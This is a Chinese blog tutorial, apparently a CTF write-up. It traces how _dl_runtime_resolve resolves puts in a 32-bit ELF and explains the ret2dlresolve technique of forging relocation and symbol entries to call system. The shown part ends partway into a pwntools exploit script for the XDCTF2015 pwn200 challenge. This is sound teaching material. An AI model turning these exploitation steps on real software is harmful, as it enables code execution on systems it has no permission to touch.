@@ -1,0 +1,1314 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+<meta http-equiv="content-language" content="zh-cn">
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #ff009e;
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #e6006b, 0 0 5px #ff009e;
+    }
+    .pace .pace-activity {
+        border-top-color: #ff009e;
+        border-left-color: #ff009e;
+    }
+</style>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="pwn,elf,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="pikachu's Blog" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.png?v=5.1.0">
+
+
+
+
+
+
+<meta name="description" content="前言  在Linux中如果程序想要调用其它动态链接库的函数，必须要在程序加载的时候动态链接；在一个程序运行过程中，可能很多函数在程序执行完时都不会用到，比如一些错误处理函数或者一些用户很少用到的功能模块，所以ELF采用一种叫做延迟绑定(Lazy Binding)的做法，基本思想就是当函数第一次被调用的时候才进行绑定（符号查找、重定位等）；而在Linux中是利用_dl_runtime_resolve">
+<meta name="keywords" content="pwn,elf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dl-runtime-resolve">
+<meta property="og:url" content="https://hitcxy.com/2020/dl-runtime-resolve/index.html">
+<meta property="og:site_name" content="pikachu&#39;s Blog">
+<meta property="og:description" content="前言  在Linux中如果程序想要调用其它动态链接库的函数，必须要在程序加载的时候动态链接；在一个程序运行过程中，可能很多函数在程序执行完时都不会用到，比如一些错误处理函数或者一些用户很少用到的功能模块，所以ELF采用一种叫做延迟绑定(Lazy Binding)的做法，基本思想就是当函数第一次被调用的时候才进行绑定（符号查找、重定位等）；而在Linux中是利用_dl_runtime_resolve">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/1.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/2.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/3.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/4.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/5.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/6.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/7.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/8.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/9.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/10.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/11.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/12.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/13.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/14.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/15.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/16.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/17.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/18.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/19.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/20.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/21.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/22.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/23.png">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/24.jpg">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/25.png">
+<meta property="og:updated_time" content="2020-09-25T15:00:32.564Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="dl-runtime-resolve">
+<meta name="twitter:description" content="前言  在Linux中如果程序想要调用其它动态链接库的函数，必须要在程序加载的时候动态链接；在一个程序运行过程中，可能很多函数在程序执行完时都不会用到，比如一些错误处理函数或者一些用户很少用到的功能模块，所以ELF采用一种叫做延迟绑定(Lazy Binding)的做法，基本思想就是当函数第一次被调用的时候才进行绑定（符号查找、重定位等）；而在Linux中是利用_dl_runtime_resolve">
+<meta name="twitter:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"right","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: 'RI3NF6GUI0',
+      apiKey: '3d33fa60ba30d3b17f37220bb1a36749',
+      indexName: 'blogIndex',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://hitcxy.com/2020/dl-runtime-resolve/">
+
+
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+  <title> dl-runtime-resolve | pikachu's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?41fc030db57d5570dd22f78997dc4a7e";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+
+	<a href="https://github.com/hitcxy/blog" rel="external nofollow noopener noreferrer" target="_blank"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://camo.githubusercontent.com/82b228a3648bf44fc1163ef44c62fcc60081495e/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f6c6566745f7265645f6161303030302e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_left_red_aa0000.png"></a>
+
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">pikachu's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+    
+      <h1 class="site-subtitle" itemprop="description">Easy coding,easy life.</h1>
+    
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-guestbook">
+          <a href="/guestbook" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-commenting"></i> <br>
+            
+            留言
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br>
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="https://hitcxy.com/2020/dl-runtime-resolve/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="pikachu">
+    <meta itemprop="description" content>
+    <meta itemprop="image" content="/images/avatar/1.jpg">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="pikachu's Blog">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="pikachu's Blog" src>
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                dl-runtime-resolve
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-08-16T19:50:54+08:00">
+                2020-08-16
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-09-25T23:00:32+08:00">
+                2020-09-25
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+
+          
+
+          
+
+          
+
+          
+          
+             <span id="/2020/dl-runtime-resolve/" class="leancloud_visitors" data-flag-title="dl-runtime-resolve">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          <br><span class="post-time">
+           <span class="post-meta-item-icon">
+             <i class="fa fa-edit"></i>
+           </span>
+           <span class="post-meta-item-text">WordCount:</span>
+           <span class="post-count">1,703字</span>
+			<span class="post-meta-divider">|</span>
+			<span class="post-meta-item-text">min2read:</span>
+           <span class="post-count">8分钟</span>
+
+         </span>
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><p><strong>前言</strong></p>
+<ul>
+<li>在<code>Linux</code>中如果程序想要调用其它动态链接库的函数，必须要在程序加载的时候动态链接；在一个程序运行过程中，可能很多函数在程序执行完时都不会用到，比如一些错误处理函数或者一些用户很少用到的功能模块，所以ELF采用一种叫做延迟绑定<code>(Lazy Binding)</code>的做法，基本思想就是当函数第一次被调用的时候才进行绑定（符号查找、重定位等）；而在<code>Linux</code>中是利用<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>函数来对动态链接的函数进行重定位的。</li>
+</ul>
+<a id="more"></a>
+<h1 id="dl-runtime-resolve函数具体运行模式"><a href="#dl-runtime-resolve函数具体运行模式" class="headerlink" title="_dl_runtime_resolve函数具体运行模式"></a>_dl_runtime_resolve函数具体运行模式</h1><ol>
+<li>首先用<code>link_map</code>访问<code>.dynamic</code>，分别取出<code>.dynstr</code>、<code>.dynsym</code>、<code>.rel.plt</code>的地址</li>
+<li><code>.rel.plt</code>+参数<code>reloc_index</code>，求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></li>
+<li><code>rel-&gt;r_info</code> &gt;&gt; <code>8</code> 作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作<code>sym</code></li>
+<li><code>.dynstr</code> + <code>sym-&gt;st_name</code>得出符号名 字符串指针</li>
+<li>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即<code>GOT</code>表</li>
+<li>最后调用这个函数</li>
+</ol>
+<h1 id="以puts为例追踪一下ELF文件libc函数解析过程"><a href="#以puts为例追踪一下ELF文件libc函数解析过程" class="headerlink" title="以puts为例追踪一下ELF文件libc函数解析过程"></a>以<code>puts</code>为例追踪一下<code>ELF</code>文件<code>libc</code>函数解析过程</h1><h2 id="call-puts-plt"><a href="#call-puts-plt" class="headerlink" title="call   puts@plt"></a><code>call   puts@plt</code></h2><p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/1.png" alt="image.png"></p>
+<h2 id="si进入call-puts-plt"><a href="#si进入call-puts-plt" class="headerlink" title="si进入call   puts@plt"></a><code>si</code>进入<code>call   puts@plt</code></h2><p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/2.png" alt="image.png"></p>
+<h2 id="因为会jmp-dword-ptr-0x804a00c-，所以查看一下0x804a00c的内容，存放的是0x080482e6地址，其中0x080482e6是puts-plt第二条指令的地址，即read-got中初始存放read-plt的第二条指令地址"><a href="#因为会jmp-dword-ptr-0x804a00c-，所以查看一下0x804a00c的内容，存放的是0x080482e6地址，其中0x080482e6是puts-plt第二条指令的地址，即read-got中初始存放read-plt的第二条指令地址" class="headerlink" title="因为会jmp   dword ptr [0x804a00c]，所以查看一下0x804a00c的内容，存放的是0x080482e6地址，其中0x080482e6是puts@plt第二条指令的地址，即read@got中初始存放read@plt的第二条指令地址"></a>因为会<code>jmp   dword ptr [0x804a00c]</code>，所以查看一下<code>0x804a00c</code>的内容，存放的是<code>0x080482e6</code>地址，其中<code>0x080482e6</code>是<code>puts@plt</code>第二条指令的地址，即<strong>read@got</strong>中初始存放<code>read@plt</code>的<strong>第二条指令地址</strong></h2><p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/3.png" alt="image.png"></p>
+<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/4.png" alt="image.png"></p>
+<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/5.png" alt="image.png"></p>
+<h2 id="jmp-0x80482d0"><a href="#jmp-0x80482d0" class="headerlink" title="jmp   0x80482d0"></a><code>jmp   0x80482d0</code></h2><p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/6.png" alt="image.png"></p>
+<ul>
+<li>其中<code>ds:0x804a008</code>存放的是<code>_dl_runtime_resolve</code>的地址</li>
+</ul>
+<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/7.png" alt="image.png"></p>
+<ul>
+<li>这样的话，加上之前的<code>push 0</code>，就<code>push</code>了两个参数，这两个参数刚好是<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>需要的参数，其中<code>0x804a004</code>就是<code>link_map</code>指针，<code>0</code>就是<code>reloc_index</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push   0</span><br><span class="line">push   dword ptr [0x804a004]</span><br></pre></td></tr></table></figure>
+<h2 id="那么我们看看通过这两个参数是如何找到puts函数的呢"><a href="#那么我们看看通过这两个参数是如何找到puts函数的呢" class="headerlink" title="那么我们看看通过这两个参数是如何找到puts函数的呢"></a>那么我们看看通过这两个参数是如何找到<code>puts</code>函数的呢</h2><ul>
+<li>首先找到<code>link_map</code>的地址</li>
+</ul>
+<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/8.png" alt="image.png"></p>
+<ul>
+<li>然后通过<code>link_map</code>找到<code>.dynamic</code>的地址，其中第三个地址就是<code>.dynamic</code>的地址，即<code>0x8049f14</code></li>
+</ul>
+<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/9.png" alt="image.png"></p>
+<ul>
+<li>然后通过<code>.dynamic</code>来找到<code>.dynstr</code>、<code>.dynsym</code>、<code>.rel.plt</code>的地址<br><code>.dynamic</code>的地址加<code>0x44</code>的位置是<code>.dynstr:[0x08049f14+0x44]=[0x08049f58]</code>，即<code>0x0804821c</code><br><code>.dynamic</code>的地址加<code>0x4c</code>的位置是<code>.dynsym:[0x08049f14+0x4c]=[0x08049f60]</code>，即<code>0x080481cc</code><br><code>.dynamic</code>的地址加<code>0x84</code>的位置是<code>.rel.plt:[0x08049f14+0x84]=[0x08049f98]</code>，即<code>0x08048298</code></li>
+</ul>
+<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/10.png" alt="image.png"></p>
+<ul>
+<li>然后用<code>.rel.plt</code>的地址加上参数<code>reloc_index</code>，即<code>0x8048298+0=0x8048298</code>找到函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></li>
+</ul>
+<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/11.png" alt="image.png"></p>
+<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/12.png" alt="image.png"></p>
+<ul>
+<li>这里<code>rel</code>为<code>0x8048298</code>，所以</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r_offset = 0x804a00c</span><br><span class="line">r_info = 107h</span><br></pre></td></tr></table></figure>
+<ul>
+<li>通过<code>Elf32_rel</code>结构的<code>r_info &gt;&gt; 8 = 107h &gt;&gt; 8 = 1</code> 作为<code>.dynsym</code>中的下标</li>
+</ul>
+<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/13.png" alt="image.png"></p>
+<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/14.png" alt="image.png"></p>
+<ul>
+<li>查看<code>0x80481dc</code>内存，找到<code>puts</code>在<code>.dynstr</code>表项索引为<code>0x1a</code>，所以<code>st_name</code>的地址为<code>0x804821c+0x1a=0x8048236</code></li>
+</ul>
+<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/15.png" alt="image.png"></p>
+<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/16.png" alt="image.png"></p>
+<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/17.png" alt="image.png"></p>
+<ul>
+<li>最后在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即<code>GOT</code>表就可以了</li>
+</ul>
+<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/18.png" alt="image.png"></p>
+<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/19.png" alt="image.png"></p>
+<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><ul>
+<li>事实上，虚拟地址是从<code>st_name</code>得来的，只要我们能够修改这个<code>st_name</code>的内容就可以执行任意函数，比如把<code>st_name</code>的内容修改为<code>&quot;system&quot;</code></li>
+<li><code>reloc_index</code>即参数<code>n</code>是我们可以控制的，我们需要做的事通过一系列操作，把<code>reloc_index</code>可控转化为<code>st_name</code>可控；我们需要在一个可写地址上构造一系列伪结构就可以完成利用或在条件允许的情况下直接修改<code>.dynstr</code></li>
+<li>所以我们需要在程序中找一段空间<code>start</code>出来，放我们直接构造的<code>fake_dynsym</code>，<code>fake_dynstr</code>和<code>fake_rel_plt</code>等，然后利用栈迁移到手法将栈转移到<code>start</code></li>
+</ul>
+<h2 id="计算reloc-index"><a href="#计算reloc-index" class="headerlink" title="计算reloc_index"></a>计算<span id="inline-blue">reloc_index</span></h2><p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/20.png" alt="image.png"></p>
+<ul>
+<li><code>relic_index = fake_rel_plt_addr - 0x804833c</code></li>
+</ul>
+<h2 id="计算r-info"><a href="#计算r-info" class="headerlink" title="计算r_info"></a>计算<span id="inline-green">r_info</span></h2><p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/21.png" alt="image.png"></p>
+<ul>
+<li><code>r_info</code>的计算方法有两个步骤</li>
+<li><code>x = （欲伪造的地址 - .dynsym基地址）/ 0x10</code></li>
+<li><code>r_info = x &lt;&lt; 8 | 0x7</code></li>
+</ul>
+<h2 id="计算st-name"><a href="#计算st-name" class="headerlink" title="计算st_name"></a>计算<span id="inline-yellow">st_name</span></h2><p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/dl-runtime-resolve/22.png" alt="image.png"></p>
+<ul>
+<li><code>st_name = fake_dynstr_addr - 0x804827c</code></li>
+</ul>
+<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>（这里有<code>XDCTF2015</code>的<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2dlresolve/XDCTF-2015/main" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-github fa-lg"></i> pwn200</a>）</p>
+<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><ul>
+<li>直接使用 <code>write</code> 泄漏 <code>libc</code> ，然后执行 <code>system(&#39;/bin/sh&#39;)</code></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line">pc=<span class="string">'./main'</span></span><br><span class="line">aslr=<span class="literal">True</span></span><br><span class="line">context.log_level=<span class="literal">True</span></span><br><span class="line"><span class="comment">#context.terminal = ["deepin-terminal","-x","sh","-c"]</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">'./libc6_2.27-3ubuntu1.2_i386.so'</span>)</span><br><span class="line">pwn200=ELF(<span class="string">'./main'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local==<span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;)</span></span><br><span class="line">    p = process(pc,aslr=aslr)</span><br><span class="line">    <span class="comment">#gdb.attach(p,'c')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    remote_addr=[<span class="string">'111.198.29.45'</span>, <span class="number">39802</span>]</span><br><span class="line">    p=remote(remote_addr[<span class="number">0</span>],remote_addr[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x : p.recvuntil(x ,drop=<span class="literal">True</span>)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>   : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x : p.recv(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a,b)</span><br><span class="line">pi = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(b =<span class="string">""</span>)</span>:</span></span><br><span class="line">    gdb.attach(p , b)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span><span class="params">(s, addr)</span>:</span></span><br><span class="line">    log.info(<span class="string">'\033[1;31;40m %s --&gt; 0x%x \033[0m'</span> % (s,addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">raddr</span><span class="params">(a=<span class="number">6</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(a==<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">return</span> u64(rv(a).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> u64(rl().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 